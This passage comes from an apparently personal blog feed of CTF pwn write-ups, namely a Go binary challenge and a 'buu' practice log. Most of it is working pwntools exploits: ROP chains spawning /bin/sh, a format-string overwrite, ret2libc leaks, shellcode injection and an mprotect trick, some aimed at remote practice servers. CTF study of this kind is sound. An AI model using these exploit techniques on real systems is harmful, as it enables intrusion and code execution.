(<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recv(timeout = <span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;TRY AGAIN?&quot;</span> <span class="keyword">in</span> res :</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">io.sendline(<span class="string">F&quot;<span class="subst">&#123;num_list[pos[<span class="number">0</span>]]&#125;</span> <span class="subst">&#123;num_list[pos[<span class="number">1</span>]]&#125;</span> <span class="subst">&#123;num_list[pos[<span class="number">2</span>]]&#125;</span> <span class="subst">&#123;num_list[pos[<span class="number">3</span>]]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># WIN</span></span><br><span class="line">res = io.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;WIN&quot;</span> <span class="keyword">in</span> res :</span><br><span class="line">success(<span class="string">&quot;Win!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">info(<span class="string">&quot;Wrong?&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;EXIT?\n&quot;</span>, <span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;(4) EXIT\n&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x494B0F&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx_ret = <span class="number">0x48546c</span></span><br><span class="line">pop_rax_ret = <span class="number">0x405b78</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x41c41c</span></span><br><span class="line">syscall_ret = <span class="number">0x45c849</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x44dbe3</span></span><br><span class="line">mov_val_rax_rcx_ret = <span class="number">0x42b353</span> <span class="comment"># mov qword ptr [rax], rcx; ret;</span></span><br><span class="line">xchg_rax_r9_ret = <span class="number">0x45b367</span></span><br><span class="line">mov_rdi_r9 = <span class="number">0x410d24</span> <span class="comment"># mov rdi, r9; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span></span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x405b78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x460</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(elf.bss())</span><br><span class="line">payload += p64(pop_rcx_ret)</span><br><span class="line">payload += p64(<span class="number">0x68732f6e69622f</span>)</span><br><span class="line">payload += p64(mov_val_rax_rcx_ret)</span><br><span class="line">payload += p64(xchg_rax_r9_ret)</span><br><span class="line">payload += p64(mov_rdi_r9)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;SURE?\n&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>首先是爆破游戏，然后给溢出，细看：<a href="https://www.cnblogs.com/winmt/articles/16036535.html">winmt师傅</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GO-PWN&quot;&gt;&lt;a href=&quot;#GO-PWN&quot; class=&quot;headerlink&quot; title=&quot;GO-PWN&quot;&gt;&lt;/a&gt;GO-PWN&lt;/h1&gt;&lt;p&gt;首先go的二进制文件分析与C&amp;#x2F;C++二进制文件分析大有不同，有些老东西都不能运用得当&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Go-pwn" scheme="http://s1nec-1o.github.io/categories/Go-pwn/"/>
    
    
    <category term="go" scheme="http://s1nec-1o.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>buu做题记录</title>
    <link href="http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-03-11T15:00:19.000Z</published>
    <updated>2024-04-28T14:12:11.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buu做题记录1"><a href="#buu做题记录1" class="headerlink" title="buu做题记录1"></a>buu做题记录1</h1><p>算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，之后也不知道要干什么，就这样子吧</p><h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211039.png" alt="image-20240303211815707" style="zoom:50%;" /><p>可以看到有格式字符串漏洞，原本因为1想的是password会在栈上出现，但是并没有应该是被覆盖掉了，因此我们想到直接修改password</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211040.png" alt="image-20240303211726790" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn5&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27277</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">pal=p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)+<span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf-2019-babyheap"></a>rctf-2019-babyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )                      <span class="comment">// &#x27;\0&#x27;绕过</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br></pre></td></tr></table></figure><p>本题主要是栈溢出，然后有个加密要绕过，因此先传入’\0’绕过strlen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">poprid_ret=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">overflow(p64(poprid_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">overflow(p64(ret)+p64(p64(poprid_ret)+p64(binsh_addr)+p64(system_addr)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>但是不知道为什么我的libcsearcher一直用不了，所以用网上找的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29738</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">padding=b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">sh.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>Ciphertext\n\n<span class="number">&#x27;</span>)   </span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">libc_base=puts_addr<span class="number">-0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>text在栈上，栈溢出</p><p>但是呢第一想法是构造ROP链，但是在ROPgadget的时候发现几乎没有适合的rop，所以只能换个想法了</p><p>发现name可写，又有rwx，因此就直接写shellcode，之后ret就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">binary=<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span></span><br><span class="line"><span class="meta">#sh=process(binary)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29953</span>)</span><br><span class="line">elf=ELF(binary)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x0000601080</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)  </span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>tell me your name\n<span class="number">&#x27;</span>)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>What <span class="keyword">do</span> you want to say to me?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">pal=0x28*b&#x27;</span>a<span class="number">&#x27;</span>+p64(ret)</span><br><span class="line">sh.send(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这道题学到了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh()) </span><br></pre></td></tr></table></figure><p>首先导入pwntool模块，之后便可以有自助shellcode，虽然我之前都是手写的但是容易挂</p><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>同<code>ciscn_2019_c_1</code></p><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/shared/ctf-learn/3dsctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:/mnt/hgfs/shared/ctf-learn$ ROPgadget --binary <span class="number">3</span>dsctf_2016 --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0806d8a5</span> : <span class="type">int</span> <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现ROPgadget有些东西找不出来这时候就要使用ropper函数</p><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>Roopper 的语法基本上由命令和选项组成。下面是一些常用的 Roopper 命令和选项的示例：</p><ol><li><p>分析二进制文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt;</span><br></pre></td></tr></table></figure></li><li><p>搜索特定指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --search &lt;instruction&gt;</span><br></pre></td></tr></table></figure></li><li><p>根据模式匹配搜索：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --search &lt;pattern&gt; --pattern</span><br></pre></td></tr></table></figure></li><li><p>过滤和排序指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --opcode &lt;opcode&gt; --type &lt;type&gt; --sort &lt;sort_type&gt;</span><br></pre></td></tr></table></figure></li><li><p>生成 ROP 链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --chain <span class="string">&quot;&lt;gadget1&gt;;&lt;gadget2&gt;;...&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>显示帮助信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --help</span><br></pre></td></tr></table></figure></li></ol><p>上述命令中的 <code>&lt;binary_file&gt;</code> 是要分析的二进制文件的路径。</p><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb      <strong>说明即使是32位的在执行syscall时的参数仍然在寄存器中</strong></li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>但是呢没有&#x2F;bin&#x2F;sh所以在栈上构造</p><p>所以泄露栈？</p><p>但是我们发现好像没法玩，因为什么都没有</p><p>这时候是在搞不了发现原来有后门函数，真的绷不住了</p><p>首先shift+F12找到有个flag.txt字符串，然后ctrl+x找到调用的函数</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211042.png" alt="image-20240306192130678" style="zoom:50%;" /><p>然后发现只有fget，实在是不会了，该flag位置在0x80ECA2D然后ctrl+s有rw权限因此读flag</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211043.png" alt="image-20240306193620444"></p><p>但是有个问题，我发现<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211044.png" alt="image-20240306195251819"></p><p>他根本没有push ebp，靠！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26826</span>)</span><br><span class="line"></span><br><span class="line">flag_addr=<span class="number">0x80ECA2D</span></span><br><span class="line">backdoor=<span class="number">0x80489A0</span></span><br><span class="line"><span class="built_in">printf</span>=<span class="number">0x0804f0a0</span></span><br><span class="line"><span class="built_in">exit</span>=<span class="number">0x0804e660</span></span><br><span class="line">pal=<span class="number">0x2d</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(backdoor)+p32(<span class="built_in">printf</span>)+p32(<span class="built_in">exit</span>)+p32(flag_addr)</span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h3><p>我一开始的思路是利用main函数里的gets造成溢出，覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容，但是后来在百度fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。</p><p>后来我在程序了发现了mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似</p><p>由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret&#x3D;0x806fcc8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary not_the_same_3dsctf_2016 --only <span class="string">&quot;pop|ret&quot;</span>|grep pop</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211045.png" alt="在这里插入图片描述"></p><p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr&#x3D;0x80eb000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br></pre></td></tr></table></figure><p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最好读入shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 